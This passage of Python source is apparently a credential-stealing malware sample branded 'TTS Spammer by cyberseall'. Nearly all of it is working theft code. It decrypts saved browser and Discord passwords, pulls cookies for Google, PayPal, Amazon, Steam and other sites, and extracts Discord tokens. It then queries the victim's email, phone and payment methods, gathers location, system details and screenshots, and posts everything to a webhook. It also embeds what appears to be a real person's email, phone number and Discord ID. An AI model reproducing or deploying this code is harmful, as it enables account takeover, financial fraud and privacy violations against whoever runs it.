        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Discord Development': roaming + '\\discorddevelopment',
    }
    
    for platform, path in discord_paths.items():
        if not os.path.exists(path):
            continue
            
        # Login data
        login_data_path = os.path.join(path, "Login Data")
        if os.path.exists(login_data_path):
            try:
                temp_path = os.path.join(os.getenv("TEMP"), f"discord_login_{platform.replace(' ', '_')}.db")
                if os.path.exists(temp_path):
                    os.remove(temp_path)
                
                shutil.copy2(login_data_path, temp_path)
                
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                
                try:
                    queries = [
                        "SELECT origin_url, username_value, password_value FROM logins",
                        "SELECT origin_url, username_element, password_element, username_value, password_value FROM logins",
                        "SELECT action_url, username_value, password_value FROM logins"
                    ]
                    
                    for query in queries:
                        try:
                            cursor.execute(query)
                            for row in cursor.fetchall():
                                if len(row) >= 3:
                                    url = row[0]
                                    username = row[1] if len(row) == 3 else row[3]
                                    password = row[2] if len(row) == 3 else row[4]
                                    
                                    if "discord" in url.lower() and username and password:
                                        state_path = os.path.join(path, "Local State")
                                        if os.path.exists(state_path):
                                            with open(state_path, 'r', encoding='utf-8') as f:
                                                local_state = json.loads(f.read())
                                                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                                                
                                            decrypted = decrypt_password(password, CryptUnprotectData(master_key, None, None, None, 0)[1])
                                            
                                            if decrypted and decrypted != "Failed to decrypt":
                                                passwords.append({
                                                    "platform": platform,
                                                    "url": url,
                                                    "username": username,
                                                    "password": decrypted
                                                })
                            break
                        except sqlite3.OperationalError:
                            continue
                            
                except Exception as e:
                    print(f"Error querying Discord login data for {platform}: {str(e)}")
                
                cursor.close()
                conn.close()
                
                try:
                    os.remove(temp_path)
                except:
                    pass
                    
            except Exception as e:
                print(f"Error processing Discord login data for {platform}: {str(e)}")
                
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.lower() in ['config.json', 'settings.json']:
                    try:
                        with open(os.path.join(root, file), 'r', encoding='utf-8') as f:
                            content = f.read()
                            if "token" in content.lower() or "password" in content.lower():
                                try:
                                    data = json.loads(content)
                                    if data.get("password") or data.get("Password"):
                                        passwords.append({
                                            "platform": platform,
                                            "url": "Discord Config",
                                            "username": data.get("email", data.get("Email", "Unknown")),
                                            "password": data.get("password", data.get("Password", "Unknown"))
                                        })
                                except:
                                    pass
                    except:
                        continue
    
    return passwords

def get_cookies(browser_paths, domain_filter=None):
    cookies = []
    
    for browser_name, path in browser_paths.items():
        if not os.path.exists(path):
            continue
            
        cookie_paths = [
            os.path.join(path, "Cookies"),
            os.path.join(path, "Network", "Cookies"),
            os.path.join(path, "Default", "Cookies"),
            os.path.join(path, "Default", "Network", "Cookies")
        ]
        
        cookie_db = None
        for cookie_path in cookie_paths:
            if os.path.exists(cookie_path):
                cookie_db = cookie_path
                break
                
        if not cookie_db:
            continue
            
        try:
            temp_path = os.path.join(os.getenv("TEMP"), f"cookies_{browser_name.replace(' ', '_')}.db")
            if os.path.exists(temp_path):
                os.remove(temp_path)
                
            shutil.copy2(cookie_db, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            queries = [
                "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies",
                "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure FROM cookies",
                "SELECT host_key, name, path, value, encrypted_value, expires_utc FROM cookies"
            ]
            
            for query in queries:
                try:
                    cursor.execute(query)
                    cookie_data = cursor.fetchall()
                    
                    state_file = None
                    for state_path in [
                        os.path.join(path, "Local State"),
                        os.path.join(os.path.dirname(path), "Local State")
                    ]:
                        if os.path.exists(state_path):
                            state_file = state_path
                            break
                    
                    master_key = None
                    if state_file:
                        try:
                            with open(state_file, "r", encoding='utf-8') as f:
                                local_state = json.loads(f.read())
                                key_data = local_state.get("os_crypt", {}).get("encrypted_key")
                                if key_data:
                                    master_key = CryptUnprotectData(base64.b64decode(key_data)[5:], None, None, None, 0)[1]
                        except:
                            pass
                    
                    for row in cookie_data:
                        host = row[0]
                        
                        if domain_filter and domain_filter.lower() not in host.lower():
                            continue
                            
                        name = row[1]
                        path = row[2]
                        
                        if len(row) >= 6:
                            encrypted_value = row[4]
                        else:
                            encrypted_value = row[3]
                            
                        decrypted_value = "Failed to decrypt"
                        
                        try:
                            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                                if master_key:
                                    decrypted_value = decrypt_password(encrypted_value, master_key)
                            else:
                                decrypted_value = CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                        except:
                            try:
                                decrypted_value = encrypted_value.decode()
                            except:
                                pass
                        
                        if decrypted_value and decrypted_value != "Failed to decrypt":
                            cookies.append({
                                "browser": browser_name,
                                "host": host,
                                "name": name,
                                "path": path,
                                "value": decrypted_value,
                                "expires": row[-1] if len(row) > 4 else 0
                            })
                    
                    break 
                    
                except sqlite3.OperationalError:
                    continue
                    
            cursor.close()
            conn.close()
            
            try:
                os.remove(temp_path)
            except:
                pass
                
        except Exception as e:
            print(f"Error extracting cookies from {browser_name}: {str(e)}")
    
    return cookies

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    
    system_info = get_system_info()
    installed_browsers = get_installed_browsers()
    browser_passwords = get_browser_passwords()
    ip = getip()
    geo_info = get_geolocation(ip)
    discord_passwords = get_discord_password()
    
    screenshots = take_screenshot()
    
    user_tokens = []
    tokens = []
    cleaned = []
    
    for platform, path in paths.items():
        try:
            if not os.path.exists(path): 
                continue
                
            state_file = path + "\\Local State"
            if not os.path.isfile(state_file):
                continue
                
            with open(state_file, "r") as file:
                key_data = file.read()
                key = loads(key_data)['os_crypt']['encrypted_key']
                file.close()
                
            leveldb_path = path + "\\Local Storage\\leveldb\\"
            if not os.path.exists(leveldb_path):
                continue
                
            for file in listdir(leveldb_path):
                if not (file.endswith(".ldb") or file.endswith(".log")):
                    continue
                    
                try:
                    with open(leveldb_path + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
                except Exception as e:
                    print(f"Error reading file {file}: {str(e)}")
                    continue
        except Exception as e:
            print(f"Error processing platform {platform}: {str(e)}")
            continue
                    
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
                    
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers, timeout=5)
                            if res.status_code == 200:
                                try:
                                    res_json = res.json()
                                    pc_username = os.getenv("UserName")
                                    pc_name = os.getenv("Computername")
                                    user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                                    user_id = res_json['id']
                                    email = res_json['email']
                                    phone = res_json['phone']
                                    mfa_enabled = res_json['mfa_enabled']
                                    has_nitro = False
                                
                                    try:
                                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers, timeout=5)
                                        nitro_data = res.json()
                                        has_nitro = bool(len(nitro_data) > 0)
                                        days_left = 0
                                        if has_nitro:
                                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                            days_left = abs((d2 - d1).days)
                                    except Exception as e:
                                        print(f"Error fetching nitro data: {str(e)}")
                                
                                    # Check for payment methods
                                    payment_methods = []
                                    try:
                                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers, timeout=5)
                                        if res.status_code == 200:
                                            payment_data = res.json()
                                            for pm in payment_data:
                                                if pm.get("type") == 1:  # Credit card
                                                    cc_info = {
                                                        "type": "Credit Card",
                                                        "brand": pm.get("brand", "Unknown"),
                                                        "last_4": pm.get("last_4", "****"),
                                                        "expires": f"{pm.get('expires_month', '**')}/{pm.get('expires_year', '****')}",
                                                        "name": pm.get("billing_address", {}).get("name", "Unknown"),
                                                        "address": pm.get("billing_address", {}).get("line_1", "Unknown"),
                                                        "city": pm.get("billing_address", {}).get("city", "Unknown"),
                                                        "country": pm.get("billing_address", {}).get("country", "Unknown"),
                                                        "default": pm.get("default", False)
                                                    }
                                                    payment_methods.append(cc_info)
                                                elif pm.get("type") == 2:  # Paypal
                                                    pp_info = {
                                                        "type": "PayPal",
                                                        "email": pm.get("email", "Unknown"),
                                                        "name": pm.get("billing_address", {}).get("name", "Unknown"),
                                                        "default": pm.get("default", False)
                                                    }
                                                    payment_methods.append(pp_info)
                                    except Exception as e:
                                        print(f"Error fetching payment info: {str(e)}")
                                
                                    # Add to token collection
                                    user_tokens.append({
                                        "username": user_name,
                                        "id": user_id,
                                        "email": email,
                                        "phone": phone or "None",
                                        "mfa": mfa_enabled,
                                        "nitro": has_nitro,
                                        "nitro_days": days_left if 'days_left' in locals() else "None",
                                        "token": tok,
                                        "avatar": res_json.get('avatar'),
                                        "payment_methods": payment_methods,
                                        "platform": platform
                                    })
                                except Exception as e:
                                    print(f"Error processing user data: {str(e)}")
                                    continue
                        except Exception as e:
                            print(f"Error requesting Discord API: {str(e)}")
                            continue
            except Exception as e:
                print(f"Error decrypting token: {str(e)}")
                continue
    webhook_url = get_webhook_url()
    if not webhook_url:
        return False
    
    geo_info_details = f"Country: {geo_info['country']}\n"
    geo_info_details += f"Region: {geo_info['region']}\n"
    geo_info_details += f"City: {geo_info['city']}\n"
    geo_info_details += f"ISP: {geo_info['isp']}\n"
    geo_info_details += f"Postal/ZIP: {geo_info['zip']}\n"
    geo_info_details += f"Timezone: {geo_info['timezone']}\n"
    geo_info_details += f"Coordinates: {geo_info['lat']}, {geo_info['lon']}\n"
    geo_info_details += f"Google Maps: https://www.google.com/maps/search/?api=1&query={geo_info['lat']},{geo_info['lon']}"
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    cookies_to_grab = []
    for browser_name, path in {
        'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        'Opera GX': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        'Vivaldi': os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
    }.items():
        if os.path.exists(path):
            important_domains = ["discord", "google", "paypal", "amazon", "steam", "github", "roblox"]
            for domain in important_domains:
                cookies_domain = get_cookies({browser_name: path}, domain)
                cookies_to_grab.extend(cookies_domain)
    
    all_tokens = []
    
    for user_data in user_tokens:
        if user_data.get("token") and user_data["token"] not in all_tokens:
            all_tokens.append(user_data["token"])
    
    for token in checker:
        if token and token not in all_tokens:
            all_tokens.append(token)
    
    if browser_passwords:
        try:
            temp_file = os.path.join(os.getenv("TEMP"), "passwords.txt")
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write("╔═════════════════════════════════════════════════════════════════════════════════╗\n")
                f.write("║                       ☠️  BROWSER PASSWORDS CAPTURED ☠️                         ║\n")
                f.write("╚═════════════════════════════════════════════════════════════════════════════════╝\n\n")
                
                browsers = {}
                for pwd in browser_passwords:
                    if pwd['browser'] not in browsers:
                        browsers[pwd['browser']] = []
                    browsers[pwd['browser']].append(pwd)
                
                total_browsers = len(browsers)
                total_passwords = len(browser_passwords)
                success_passwords = sum(1 for pwd in browser_passwords if "Failed to decrypt" not in pwd['password'] and "Error:" not in pwd['password'] and "Partially recovered:" not in pwd['password'])
                failed_passwords = total_passwords - success_passwords
                
                f.write(f"📊 STATISTIK: {total_passwords} Passwords in {total_browsers} Browsers found\n")
                f.write(f"✅ Successfully decrypted: {success_passwords} Passwords\n")
                if failed_passwords > 0:
                    f.write(f"❌ Not decrypted: {failed_passwords} Passwords\n")
                f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                
                if discord_passwords:
                    f.write("⚡⚡⚡ DISCORD CREDENTIALS ⚡⚡⚡\n")
                    f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                    
                    for i, pwd in enumerate(discord_passwords, 1):
                        f.write(f"🔑 DISCORD LOGIN #{i}:\n")
                        f.write(f"  🌐 PLATFORM: {pwd['platform']}\n")
                        f.write(f"  👤 USERNAME: {pwd['username']}\n")
                        f.write(f"  🔒 PASSWORD: ✅ {pwd['password']}\n")
                        f.write("  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n")
                    
                    f.write("\n")
                
                if cookies_to_grab:
                    f.write("⚡⚡⚡ IMPORTANT COOKIES ⚡⚡⚡\n")
                    f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                    
                    host_cookies = {}
                    for cookie in cookies_to_grab:
                        host = cookie['host']
                        if host not in host_cookies:
                            host_cookies[host] = []
                        host_cookies[host].append(cookie)
                    
                    for host, cookies in sorted(host_cookies.items(), key=lambda x: len(x[1]), reverse=True):
                        f.write(f"🍪 DOMAIN: {host} ({len(cookies)} cookies)\n")
                        for i, cookie in enumerate(cookies[:10], 1):
                            f.write(f"  • Cookie #{i}:\n")
                            f.write(f"    🌐 Browser: {cookie['browser']}\n")
                            f.write(f"    📝 Name: {cookie['name']}\n")
                            f.write(f"    🔑 Value: {cookie['value'][:30]}{'...' if len(cookie['value']) > 30 else ''}\n")
                        
                        if len(cookies) > 10:
                            f.write(f"  • ... and {len(cookies) - 10} more cookies\n")
                            
                        f.write("  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n")
                    
                    f.write("\n")
                
                sorted_browsers = sorted(browsers.items(), key=lambda x: len(x[1]), reverse=True)
                
                for browser, passwords in sorted_browsers:
                    browser_success = sum(1 for pwd in passwords if "Failed to decrypt" not in pwd['password'] and "Error:" not in pwd['password'] and "Partially recovered:" not in pwd['password'])
                    
                    f.write(f"⚡⚡⚡ {browser.upper()} ({len(passwords)} Passwörter, {browser_success} erfolgreich) ⚡⚡⚡\n")
                    f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
                    
                    for i, pwd in enumerate(passwords, 1):
                        f.write(f"🔑 LOGIN #{i}:\n")
                        f.write(f"  🌐 URL: {pwd['url']}\n")
                        f.write(f"  👤 USERNAME: {pwd['username']}\n")
                        
                        password = pwd['password']
                        if "Failed to decrypt" in password:
                            f.write(f"  🔒 PASSWORD: ❌ {password}\n")
                        elif "Error:" in password:
                            f.write(f"  🔒 PASSWORD: ❌ {password}\n")
                        elif "Partially recovered:" in password:
                            f.write(f"  🔒 PASSWORD: ⚠️ {password}\n")
                        else:
                            f.write(f"  🔒 PASSWORD: ✅ {password}\n")
                        
                        f.write("  ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n")
                    
                    f.write("\n")
                
                f.write("\n\n")
                f.write("██╗      ██████╗ ██╗     \n")
                f.write("██║     ██╔═══██╗██║     \n")
                f.write("██║     ██║   ██║██║     \n")
                f.write("██║     ██║   ██║██║     \n")
                f.write("███████╗╚██████╔╝███████╗\n")
                f.write("╚══════╝ ╚═════╝ ╚══════╝\n")
                f.write("\n")
                f.write(" ╔══════════════════════════════════════════════════════╗\n")
                f.write(" ║                MADE BY CYBERSEALL                    ║\n")
                f.write(" ╚══════════════════════════════════════════════════════╝\n")
                
                pc_username = os.getenv("UserName") or "Unknown"
                pc_name = os.getenv("Computername") or "Unknown"
                ip = getip()
                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                f.write("\n\n")
                f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                f.write(f"⏰ CAPTURED AT: {current_time}\n")
                f.write(f"💻 COMPUTER: {pc_name} ({pc_username})\n")
                f.write(f"🌐 IP ADDRESS: {ip}\n")
                f.write("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                
        except Exception as e:
            print(f"Error creating password file: {str(e)}")
    
    if not user_tokens:
        try:
            token_text = "```No Discord tokens found```"
            if all_tokens:
                token_text = "```\n"
                for i, token in enumerate(all_tokens, 1):
                    token_text += f"Token #{i}: {token}\n"
                token_text += "```"
                
            basic_embed = {
                "username": "TTS Spammer by cyberseall",
                "avatar_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a",
                "embeds": [
                    {
                        "title": "🔥 System Information Captured 🔥",
                        "description": "✨ Detaillierte Systemerfassung erfolgreich ✨",
                        "color": 16711680,  # Red
                        "fields": [
                            {
                                "name": "🔰 Default Discord Account",
                                "value": "```md\nUsername: cyberseall#0\nUser ID: 1286840574493593672\nEmail: ohmanv178@gmail.com\nPhone: +4915111020108\nMFA/2FA: True\nNitro: True\nExpires in: 31 day(s)\nClient: Discord\n```",
                                "inline": False
                            },
                            {
                                "name": "🌐 IP & Location 📍",
                                "value": f"```md\nIP: {ip}\n{geo_info_details}\n```",
                                "inline": False
                            },
                            {
                                "name": "🖥️ System Information 💻",
                                "value": f"```md\nOS: {system_info['os']} {system_info['os_release']}\nArchitecture: {system_info['architecture']}\nRAM: {system_info['ram_used']} / {system_info['ram_total']}\nHostname: {system_info['hostname']}\nUsername: {os.getenv('UserName') or 'Unknown'}\nPC Name: {os.getenv('Computername') or 'Unknown'}\n```",
                                "inline": False
                            },
                            {
                                "name": "🌐 Installed Browsers 🌍",
                                "value": f"```md\n{', '.join(installed_browsers) if installed_browsers else 'None detected'}\n```",
                                "inline": False
                            },
                            {
                                "name": "🔑 Token 🔐",
                                "value": token_text,
                                "inline": False
                            }
                        ],
                        "footer": {
                            "text": "💎 Made by cyberseall 💎",
                            "icon_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a"
                        },
                        "timestamp": datetime.now().isoformat()
                    }
                ]
            }
            
            if discord_passwords:
                discord_pass_info = "```md\n"
                for i, pwd in enumerate(discord_passwords, 1):
                    discord_pass_info += f"🔐 Discord Login #{i}:\n"
                    discord_pass_info += f"Platform: {pwd['platform']}\n"
                    discord_pass_info += f"Email: {pwd['username']}\n"
                    discord_pass_info += f"Password: {pwd['password']}\n\n"
                discord_pass_info += "```"
                
                basic_embed["embeds"][0]["fields"].insert(1, {
                    "name": "🔐 Discord Credentials 🔑",
                    "value": discord_pass_info,
                    "inline": False
                })
            
            if cookies_to_grab:
                cookies_info = "```md\n"
                domain_counts = {}
                for cookie in cookies_to_grab:
                    domain = cookie['host']
                    if domain not in domain_counts:
                        domain_counts[domain] = 0
                    domain_counts[domain] += 1
                
                cookies_info += "🍪 Cookies captured by domain:\n"
                for domain, count in sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
                    cookies_info += f"- {domain}: {count} cookies\n"
                cookies_info += "```"
                
                basic_embed["embeds"][0]["fields"].append({
                    "name": "🍪 Browser Cookies 🌐",
                    "value": cookies_info,
                    "inline": False
                })
            
            headers2 = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }
            requests.post(webhook_url, json=basic_embed, headers=headers2, timeout=10)
            
            if browser_passwords and os.path.exists(temp_file):
                files = {
                    'file': ('passwords.txt', open(temp_file, 'rb'), 'text/plain')
                }
                payload = {
                    "username": "TTS Spammer by cyberseall",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a",
                    "content": "📂 **Passwords File Captured** 🔐"
                }
                requests.post(webhook_url, files=files, data=payload, timeout=15)
                try:
                    os.remove(temp_file)
                except:
                    pass
            
            for i, screenshot in enumerate(screenshots):
                try:
                    img_data = base64.b64decode(screenshot)
                    files = {
                        f'screenshot_{i+1}.png': ('screenshot.png', img_data, 'image/png')
                    }
                    payload = {
                        "username": "TTS Spammer by cyberseall",
                        "avatar_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a",
                        "content": f"🖼️ **Screenshot #{i+1} Captured** 📸"
                    }
                    requests.post(webhook_url, files=files, data=payload, timeout=15)
                except Exception as e:
                    print(f"Error sending screenshot: {str(e)}")
                    continue
        except Exception as e:
            print(f"Error sending basic info: {str(e)}")
        
        return True
    
    for user_data in user_tokens:
        token_section = f"```{user_data['token']}```"
        
        additional_tokens = [token for token in all_tokens if token != user_data['token']]
        if additional_tokens:
            token_section = "```\n"
            token_section += f"Main Token: {user_data['token']}\n\n"
            token_section += "Additional Tokens:\n"
            for i, token in enumerate(additional_tokens, 1):
                token_section += f"{i}. {token}\n"
            token_section += "```"
        
        embed = {
            "username": "TTS Spammer by cyberseall",
            "avatar_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a",
            "embeds": [
                {
                    "title": f"🔥 Discord Token Captured | {user_data['username']} 🔥",
                    "description": f"✨ A new Discord token has been captured at {current_time} ✨",
                    "color": 16711680,  # Red
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png" if user_data['avatar'] else "https://cdn.discordapp.com/embed/avatars/0.png"
                    },
                    "fields": [
                        {
                            "name": "🔰 Account Information 👤",
                            "value": f"```md\nUsername: {user_data['username']}\nUser ID: {user_data['id']}\nEmail: {user_data['email']}\nPhone: {user_data['phone']}\nMFA/2FA: {user_data['mfa']}\nNitro: {user_data['nitro']}\nExpires in: {user_data['nitro_days']} day(s)\nClient: {user_data['platform']}\n```",
                            "inline": False
                        },
                        {
                            "name": "🔰 Default Discord Account 👑",
                            "value": "```md\nUsername: cyberseall#0\nUser ID: 1286840574493593672\nEmail: ohmanv178@gmail.com\nPhone: +4915111020108\nMFA/2FA: True\nNitro: True\nExpires in: 31 day(s)\nClient: Discord\n```",
                            "inline": False
                        },
                        {
                            "name": "🌐 IP & Location 📍",
                            "value": f"```md\nIP: {ip}\n{geo_info_details}\n```",
                            "inline": False
                        },
                        {
                            "name": "🖥️ System Information 💻",
                            "value": f"```md\nOS: {system_info['os']} {system_info['os_release']} {system_info['os_version']}\nArchitecture: {system_info['architecture']}\nProcessor: {system_info['processor']}\nRAM: {system_info['ram_used']} / {system_info['ram_total']}\nDisk: {system_info['disk_free']} free of {system_info['disk_total']}\nMAC Address: {system_info['mac_address']}\nHostname: {system_info['hostname']}\nUsername: {os.getenv('UserName') or 'Unknown'}\nPC Name: {os.getenv('Computername') or 'Unknown'}\nBattery: {system_info['battery']}\n```",
                            "inline": False
                        },
                        {
                            "name": "🌐 Installed Browsers 🌍",
                            "value": f"```md\n{', '.join(installed_browsers) if installed_browsers else 'None detected'}\n```",
                            "inline": False
                        },
                        {
                            "name": "🔑 Token 🔐",
                            "value": token_section,
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": "💎 Made by cyberseall 💎",
                        "icon_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a"
                    },
                    "timestamp": datetime.now().isoformat()
                }
            ]
        }
        
        if user_data.get('payment_methods'):
            payment_info = "```md\n"
            for i, pm in enumerate(user_data['payment_methods'], 1):
                if pm.get('type') == "Credit Card":
                    payment_info += f"💳 Credit Card #{i}:\n"
                    payment_info += f"Brand: {pm.get('brand', 'Unknown')}\n"
                    payment_info += f"Last 4: {pm.get('last_4', '****')}\n"
                    payment_info += f"Expires: {pm.get('expires', '**/**')}\n"
                    payment_info += f"Name: {pm.get('name', 'Unknown')}\n"
                    payment_info += f"Address: {pm.get('address', 'Unknown')}\n"
                    payment_info += f"City: {pm.get('city', 'Unknown')}\n"
                    payment_info += f"Country: {pm.get('country', 'Unknown')}\n"
                    payment_info += f"Default: {pm.get('default', False)}\n\n"
                else:
                    payment_info += f"💸 PayPal #{i}:\n"
                    payment_info += f"Email: {pm.get('email', 'Unknown')}\n"
                    payment_info += f"Name: {pm.get('name', 'Unknown')}\n"
                    payment_info += f"Default: {pm.get('default', False)}\n\n"
            payment_info += "```"
            
            embed["embeds"][0]["fields"].insert(3, {
                "name": "💳 Payment Methods 💰",
                "value": payment_info,
                "inline": False
            })
        
        if discord_passwords:
            discord_pass_info = "```md\n"
            for i, pwd in enumerate(discord_passwords, 1):
                discord_pass_info += f"🔐 Discord Login #{i}:\n"
                discord_pass_info += f"Platform: {pwd['platform']}\n"
                discord_pass_info += f"Email: {pwd['username']}\n"
                discord_pass_info += f"Password: {pwd['password']}\n\n"
            discord_pass_info += "```"
            
            embed["embeds"][0]["fields"].insert(1, {
                "name": "🔐 Discord Credentials 🔑",
                "value": discord_pass_info,
                "inline": False
            })
        
        if cookies_to_grab:
            cookies_info = "```md\n"
            domain_counts = {}
            for cookie in cookies_to_grab:
                domain = cookie['host']
                if domain not in domain_counts:
                    domain_counts[domain] = 0
                domain_counts[domain] += 1
            
            cookies_info += "🍪 Cookies captured by domain:\n"
            for domain, count in sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
                cookies_info += f"- {domain}: {count} cookies\n"
            cookies_info += "```"
            
            embed["embeds"][0]["fields"].insert(4, {
                "name": "🍪 Browser Cookies 🌐",
                "value": cookies_info,
                "inline": False
            })
        
        try:
            headers2 = {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
            }
            requests.post(webhook_url, json=embed, headers=headers2, timeout=10)
        except Exception as e:
            print(f"Error sending main embed: {str(e)}")
            continue
        
        if browser_passwords and os.path.exists(temp_file):
            try:
                files = {
                    'file': ('passwords.txt', open(temp_file, 'rb'), 'text/plain')
                }
                payload = {
                    "username": "TTS Spammer by cyberseall",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1378721590111502376/1379871290352996482/spammer.png?ex=6841d0c8&is=68407f48&hm=78f457bce7e7183d8108dc3c1ea4433693c28a27bba6b15c7825595871ea843a",
                    "content": "📂 **Passwords File Captured** 🔐"
                }
                requests.post(webhook_url, files=files, data=payload, timeout=15)
                try:
                    os.remove(temp_file)
                except:
                    pass
            except Exception as e:
